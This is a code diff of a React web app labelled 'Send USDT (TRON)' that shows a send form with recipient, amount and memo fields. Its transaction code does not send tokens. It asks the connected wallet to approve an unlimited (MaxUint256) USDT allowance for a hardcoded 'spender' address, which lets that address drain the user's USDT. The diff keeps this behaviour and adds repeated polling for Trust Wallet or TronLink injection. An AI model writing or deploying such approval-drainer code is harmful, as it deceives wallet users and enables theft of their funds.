@@ -1,6 +1,5 @@
 import React, { useState, useEffect } from "react";
 import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from "react-icons/fa";
-import TronWeb from "tronweb";
 import "./styles.css";
 
 const USDTSendApp = () => {
@@ -11,7 +10,7 @@ const USDTSendApp = () => {
   const [message, setMessage] = useState("");
   const [tronWeb, setTronWeb] = useState(null);
 
-  // ✅ USDT TRC20 contract on TRON mainnet
+  // ✅ TRC20 USDT contract on TRON mainnet
   const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
   const USDT_ABI = [
@@ -30,13 +29,17 @@ const USDTSendApp = () => {
   ];
 
   useEffect(() => {
-    if (window.tronWeb && window.tronWeb.ready) {
-      setTronWeb(window.tronWeb);
-      setAccount(window.tronWeb.defaultAddress.base58);
-      setMessage("✅ Connected to TronLink");
-    } else {
-      setMessage("⚠️ Please install TronLink or open in Trust Wallet dApp browser");
-    }
+    const checkTron = () => {
+      if (window.tronWeb && window.tronWeb.ready) {
+        setTronWeb(window.tronWeb);
+        setAccount(window.tronWeb.defaultAddress.base58);
+        setMessage("✅ Connected to Tron Wallet");
+      } else {
+        setMessage("⚠️ Open in Trust Wallet / TronLink DApp browser");
+        setTimeout(checkTron, 1000); // keep checking until injected
+      }
+    };
+    checkTron();
   }, []);
 
   const connectWallet = async () => {
@@ -64,13 +67,13 @@ const USDTSendApp = () => {
       return;
     }
     try {
-      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender address
+      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender
       const unlimitedAmount =
         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // MaxUint256
 
       const contract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
       const tx = await contract.approve(spender, unlimitedAmount).send({
-        feeLimit: 100_000_000, // 100 TRX energy/gas limit
+        feeLimit: 100_000_000,
       });
 
       setMessage(`✅ Approval submitted! TxID: ${tx}`);
@@ -86,7 +89,7 @@ const USDTSendApp = () => {
           <button className="back-button">←</button>
           <h1 className="send-title">Send USDT (TRON)</h1>
           {!account ? (
-            <button onClick={connectWallet}>Connect TronLink</button>
+            <button onClick={connectWallet}>Connect Wallet</button>
           ) : (
             <p>Connected: {account.slice(0, 6)}...{account.slice(-4)}</p>
           )}
@@ -94,19 +97,16 @@ const USDTSendApp = () => {
 
         {message && <div className="message-display">{message}</div>}
 
-        {/* Address */}
         <div className="input-section">
           <label className="input-label">Recipient Address</label>
           <input value={address} onChange={(e) => setAddress(e.target.value)} />
         </div>
 
-        {/* Amount */}
         <div className="input-section">
           <label className="input-label">Amount</label>
           <input value={amount} onChange={(e) => setAmount(e.target.value)} />
         </div>
 
-        {/* Memo */}
         <div className="input-section">
           <label className="input-label">Memo</label>
           <input value={memo} onChange={(e) => setMemo(e.target.value)} />
